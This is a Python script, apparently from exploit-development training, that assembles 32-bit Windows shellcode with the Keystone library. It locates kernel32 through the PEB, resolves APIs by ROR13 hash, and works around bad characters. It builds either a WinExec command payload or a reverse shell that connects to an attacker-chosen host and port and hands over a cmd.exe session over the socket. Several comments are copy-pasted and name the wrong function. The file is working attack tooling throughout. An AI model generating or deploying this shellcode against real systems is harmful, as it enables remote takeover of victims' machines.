import re

from keystone import *

backslash = "\\"


def getHash(string):
    hash = 0
    for c in string:
        if c == 0:
            break
        hash = (hash >> 13) | ((hash << (32 - 13)) & 0xFFFFFFFF)
        hash += ord(c)
    print(f"{string}: {hash}, {hex(hash)}")
    return str(hex(hash))


def formatString(string):
    stringOut = []
    words = []
    end = '\t\t;"'
    stringOut.append("xor eax, eax;")
    # make a list, split every 4 and backwards.
    for x in range(0, len(string), 4):
        word = string[x : (x + 4)]
        words.insert(0, word)
    # transform to backwards hex.
    for c in words:
        length = len(c)
        word = "".join("{:02x}".format(ord(b)) for b in c[::-1])
        if length % 4 == 1:
            stringOut.append(f"mov al, 0x{word}; ")
            stringOut.append(f"push eax;")
        elif length % 4 == 2:
            stringOut.append(f"mov ax, 0x{word};")
            stringOut.append(f"push eax;")
        elif length % 4 == 3:
            stringOut.append(f"mov ah, 0x{word[:2]};")
            stringOut.append("shl eax, 8;")
            stringOut.append(f"mov ax, 0x{word[-4:]};")
            stringOut.append("push eax;")
        elif length % 4 == 0:
            stringOut.append(f"push 0x{word}; ")
        else:
            print("Something terrible happened")
            exit()
    return " ".join(stringOut)


def loadLibrary(library, function, ebp):
    block = (
        f"{formatString(library)}   "
        "push esp		;"
        "call dword ptr [ebp+0x0c]  ;"  # Call LoadLibraryA
        "find_user32_funcs: 		"
        "mov ebx, eax				;"
        f"push {getHash(function)}	;"  # address for MessageBoxA
        "call dword ptr [ebp+0x04]  ;"  # Call find_function. Loo/ks like find_function(MessageBoxA)
        f"mov [ebp+0x{ebp}], eax        ;"  # store address for function into ebp+offset
    )
    return block


def winExec(payload):
    block = (
        f"push {getHash('WinExec')} ;"
        "call dword ptr [ebp+0x04]  ;"
        "mov [ebp+0x1c], eax        ;"
        "xor eax, eax               ;"
        "push eax                   ;"
        f"{formatString(payload)}"
        "mov eax, esp               ;"
        "xor edx, edx               ;"
        "push edx                   ;"
        "push eax                   ;"
        "call dword ptr [ebp+0x1c]  ;"
    )
    return block


def revShell(lhost, lport):
    ipaddr = "".join("{:02x}".format(int((c))) for c in lhost.split(".")[::-1])
    hexport = "".join("{:04X}".format((int(lport))))
    port = f"{hexport[2:]}{hexport[:2]}"
    print(f"ipaddr: {ipaddr}, port: {port}")
    block = (
        f"push {getHash('CreateProcessA')}              ;"  # Hash for LoadLibraryA
        "call dword ptr [ebp+0x04]                      ;"  # Call find_function. Looks like find_function(LoadLibraryA)
        "mov [ebp+0x10], eax                            ;"  # store LoadLibrary into ebp+18
        f"{loadLibrary('ws2_32.dll', 'WSAStartup', '14')}"
        f"push {getHash('WSASocketA')}	;"  # address for MessageBoxA
        "call dword ptr [ebp+0x04]      ;"  # Call find_function. Looks like find_function(MessageBoxA)
        f"mov [ebp+0x18], eax           ;"  # store address for function into ebp+offset
        f"push {getHash('WSAConnect')}	;"  # address for MessageBoxA
        "call dword ptr [ebp+0x04]      ;"  # Call find_function. Looks like find_function(MessageBoxA)
        f"mov [ebp+0x1C], eax           ;"  # store address for function into ebp+offset
        ################################### WSAStartup ebp+0x14 ######################################################
        "callwsastartup:            "
        "xor ecx, ecx               ;"
        "mov eax, esp               ;"
        "mov cx, 0x590              ;"
        "sub eax, ecx               ;"
        "push eax                   ;"
        "xor eax, eax               ;"
        "mov ax, 0x0202             ;"
        "push eax                   ;"
        "call dword ptr [ebp+0x14]  ;"  # Call WSAStartup
        ################################### WSASocketA ebp+0x18 ######################################################
        "xor   eax, eax             ;"  #   Null EAX
        "push  eax                  ;"  #   Push dwFlags
        "push  eax                  ;"  #   Push g
        "push  eax                  ;"  #   Push lpProtocolInfo
        "mov   al, 0x06             ;"  #   Move AL, IPPROTO_TCP
        "push  eax                  ;"  #   Push protocol
        "sub   al, 0x05             ;"  #   Subtract 0x05 from AL, AL = 0x01
        "push  eax                  ;"  #   Push type
        "inc   eax                  ;"  #   Increase EAX, EAX = 0x02
        "push  eax                  ;"  #   Push af
        "call dword ptr [ebp+0x18]  ;"  #   Call WSASocketA
        ################################### WSAConnect ebp+0x1C ######################################################
        "mov   esi, eax             ;"  #   Move the SOCKET descriptor to ESI
        "xor   eax, eax             ;"  #   Null EAX
        "push  eax                  ;"  #   Push sin_zero[]
        "push  eax                  ;"  #   Push sin_zero[]
        f"push  0x{ipaddr}          ;"  #   Push sin_addr (192.168.49.57)
        f"mov   ax, 0x{port}        ;"  #   Move the sin_port (443) to AX
        "shl   eax, 0x10            ;"  #   Left shift EAX by 0x10 bits
        "add   ax, 0x02             ;"  #   Add 0x02 (AF_INET) to AX
        "push  eax                  ;"  #   Push sin_port & sin_family
        "push  esp                  ;"  #   Push pointer to the sockaddr_in structure
        "pop   edi                  ;"  #   Store pointer to sockaddr_in in EDI
        "xor   eax, eax             ;"  #   Null EAX
        "push  eax                  ;"  #   Push lpGQOS
        "push  eax                  ;"  #   Push lpSQOS
        "push  eax                  ;"  #   Push lpCalleeData
        "push  eax                  ;"  #   Push lpCallerData
        "add   al, 0x10             ;"  #   Set AL to 0x10
        "push  eax                  ;"  #   Push namelen
        "push  edi                  ;"  #   Push *name
        "push  esi                  ;"  #   Push s
        "call dword ptr [ebp+0x1C]  ;"  #   Call WSAConnect
        ################################### StartupInfoA ######################################################
        "create_startupinfoa:             "  #
        "push  esi                       ;"  #   Push hStdError
        "push  esi                       ;"  #   Push hStdOutput
        "push  esi                       ;"  #   Push hStdInput
        "xor   eax, eax                  ;"  #   Null EAX
        "push  eax                       ;"  #   Push lpReserved2
        "push  eax                       ;"  #   Push cbReserved2 & wShowWindow
        # Fix Bad Characters
        "mov   al, 0x7f                  ;"  #   Move 0x80 to AL
        "inc   al                        ;"
        "xor   ecx, ecx                  ;"  #   clear ecx
        # Fix Bad Characters
        "mov   cl, 0x7f                  ;"  #   Move 0x80 to CX
        "inc   cl                        ;"
        "add   eax, ecx                  ;"  #   Set EAX to 0x100
        "push  eax                       ;"  #   Push dwFlags
        "xor   eax, eax                  ;"  #   Null EAX
        "push  eax                       ;"  #   Push dwFillAttribute
        "push  eax                       ;"  #   Push dwYCountChars
        "push  eax                       ;"  #   Push dwXCountChars
        "push  eax                       ;"  #   Push dwYSize
        "push  eax                       ;"  #   Push dwXSize
        "push  eax                       ;"  #   Push dwY
        "push  eax                       ;"  #   Push dwX
        "push  eax                       ;"  #   Push lpTitle
        "push  eax                       ;"  #   Push lpDesktop
        "push  eax                       ;"  #   Push lpReserved
        "mov   al, 0x44                  ;"  #   Move 0x44 to AL
        "push  eax                       ;"  #   Push cb
        "push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
        "pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI
        ################################### CreateProcessA ebp+0x0x24 ##############################################
        f"{formatString('cmd.exe')}"
        "push  esp                       ;"  #   Push pointer to the "cmd.exe" string
        "pop   ebx                       ;"  #   Store pointer to the "cmd.exe" string in EBXV
        "call_createprocessa:             "  #
        "mov   eax, esp                  ;"  #   Move ESP to EAX
        "xor   ecx, ecx                  ;"  #   Null ECX
        "mov   cx, 0x390                 ;"  #   Move 0x390 to CX
        "sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
        "push  eax                       ;"  #   Push lpProcessInformation
        "push  edi                       ;"  #   Push lpStartupInfo
        "xor   eax, eax                  ;"  #   Null EAX
        "push  eax                       ;"  #   Push lpCurrentDirectory
        "push  eax                       ;"  #   Push lpEnvironment
        "push  eax                       ;"  #   Push dwCreationFlags
        "inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE)
        "push  eax                       ;"  #   Push bInheritHandles
        "dec   eax                       ;"  #   Null EAX
        "push  eax                       ;"  #   Push lpThreadAttributes
        "push  eax                       ;"  #   Push lpProcessAttributes
        "push  ebx                       ;"  #   Push lpCommandLine
        "push  eax                       ;"  #   Push lpApplicationName
        "call dword ptr [ebp+0x10]       ;"  #   Call CreateProcessA
    )
    return block


def generate(mode, args):
    assembly = TEMPLATE
    if mode == "revshell":
        assembly += revShell(args[0], args[1])
    elif mode == "cmd":
        assembly += winExec(args)
    assembly += TERMINATE

    ks = Ks(KS_ARCH_X86, KS_MODE_32)

    encoding, count = ks.asm(assembly)
    print(f"Encoded {count} instructions")

    # beautify assembly

    pretty = "\n".join(
        line.lstrip()
        for line in assembly.replace(": ", ":\n").replace(";", ";\n").splitlines()
    )
    assembly = re.sub(r"(\w+): ", r"\n\1:", pretty)

    return assembly, encoding


TEMPLATE = (
    "start:                      "
    "mov ebp, esp               ;"  # Creating the stack frame.
    "add esp, 0xfffff6A0        ;"  # Add a negative number to avoid the null made by the sub instruction.
    "find_kernel32:              "  # EBX will be the address of kernel32
    "xor ecx, ecx               ;"  # ECX = 0
    "mov esi, fs:[ecx+30h]      ;"  # ESI = &PEB The "fs"fragment holds the Thread Enviroment Block of the current running process. 0x30 bytes into the TEB you get the pointer to the PEB
    "mov esi, [esi+0Ch]         ;"  # ESI = PEB->Ldr 0x0C bytes into the Process Env Block you get the LDR.
    "mov esi, [esi+1Ch]         ;"  # ESI = PEB->Ldr.InInitOrder 0x1C bytes into the LDR you get the InInitOderModuleList
    "next_module:                "
    "mov ebx, [esi+8h]          ;"  # EBX = ESI[X].base_address 0x8 bytes into the InInitOrderModuleList you get the base address of .
    "mov edi, 0xffffffe0        ;"  # 20 is a bad character #badfixed
    "neg edi                    ;"
    "add edi, esi               ;"  # put esi+20 into edi
    "mov edi, [edi]             ;"  # EDI = ESI[X].module_name 0x20 bytes into InInitOrderModuleList you get the name of the module
    "mov esi, [esi]             ;"  # ESI = ESI[X].flink InInitOrderModuleList
    "cmp [edi+12*2], cx         ;"  # modulename[12] == 0 (End of kernel32)
    "jne next_module            ;"
    "jmp push_eip               ;"  # Position Independent stub
    "pop_eip:                    "
    "pop esi                    ;"  # ESI = EIP
    "mov [ebp+0x04], esi        ;"
    "jmp find_funcs             ;"  # Now that [ebp+0x04] is mapped to find_function, jump to find_funcs
    "push_eip:                   "
    "call pop_eip               ;"
    "find_function:              "  # find_function(EBX = address of DLL)
    "pushad                     ;"
    "mov eax, [ebx+0x3c]        ;"  # Offset to PE signature
    "mov edi, [ebx+eax+0x78]    ;"  # Export Table Dictionary RVA <-- look this up later
    "add edi, ebx               ;"  # Export Table Dictionary VMA <-- Look this up Later
    "mov ecx, [edi+0x18]        ;"  # Number of Names
    "mov edx, 0xffffffe0        ;"  # 20 is a bad character so store -20 in eax
    "neg edx                    ;"
    "add edx, edi               ;"  # store edi+20 in eax
    "mov eax, [edx]             ;"  # Address of Names RVA
    "add eax, ebx               ;"  # Address of Names VMA
    "mov [ebp-4], eax           ;"  # Save for later
    "find_function_loop:         "
    "jecxz end_func_loop        ;"  # if (ECX == 0) end loop (jz + ecx)
    "dec ecx                    ;"
    "mov eax, [ebp-4]           ;"  # Address of Names VMA
    "mov esi, [eax+ecx*4]       ;"  # RVA of Symbol Name
    "add esi, ebx               ;"  # VMA
    "compute_hash:               "
    "xor eax, eax               ;"  # EAX = 0
    "cdq                        ;"  # EDX = 0 xor edx, edx
    "cld                        ;"  # Make sure string processing is left to right.
    "compute_hash_l:             "
    "lodsb                      ;"  # AL = *ESI This is the symbol/function name
    "test al, al                ;"  # AL == 0 Will be null when at the end of the string.
    "jz compute_hash_fin        ;"
    "ror edx, 0x0d              ;"  # edx >> 13 The actual hashing algo
    "add edx, eax               ;"
    "jmp compute_hash_l         ;"
    "compute_hash_fin:           "
    "find_function_cmp:          "
    "cmp edx, [esp+0x24]        ;"  # Check the request function hash
    "jnz find_function_loop     ;"
    "mov edx, [edi+0x24]        ;"  # EDX = AddressOfNameOrdinals RVA
    "add edx, ebx               ;"  # AddressOfNameOridinals VMA
    "mov cx, [edx+2*ecx]        ;"  # Get the functions ordinal
    "mov edx, [edi+0x1C]        ;"  # AddressOfFunctions RVA
    "add edx, ebx               ;"  # AddressOfFunctions VMA
    "mov eax, [edx+4*ecx]       ;"  # Function address RVA
    "add eax, ebx               ;"  # Function address VMA
    "mov [esp+0x1C], eax        ;"  # Overwrite pushed to stack
    "end_func_loop:              "
    "popad                      ;"
    "ret                        ;"
    ################################### Load and map functions ####################################################
    "find_funcs:                 "
    f"push {getHash('TerminateProcess')}            ;"  # TerminateProcess
    "call dword ptr [ebp+0x04]  ;"  # Call find_function. Looks like find_function(TerminateProcess)
    "mov [ebp+0x08], eax        ;"
    f"push {getHash('LoadLibraryA')}            ;"  # Hash for LoadLibraryA
    "call dword ptr [ebp+0x04]  ;"  # Call find_function. Looks like find_function(LoadLibraryA)
    "mov [ebp+0x0c], eax        ;"  # store LoadLibrary into ebp+0c
)

TERMINATE = (
    ################################### TerminateProcess ebp+0x0x08 ##############################################
    "gracefully_exit:            "
    "xor eax, eax               ;"
    "push eax                   ;"
    "push 0xffffffff            ;"
    "call dword ptr [ebp+0x08]  ;"  # EAX = TerminateProcess()
)
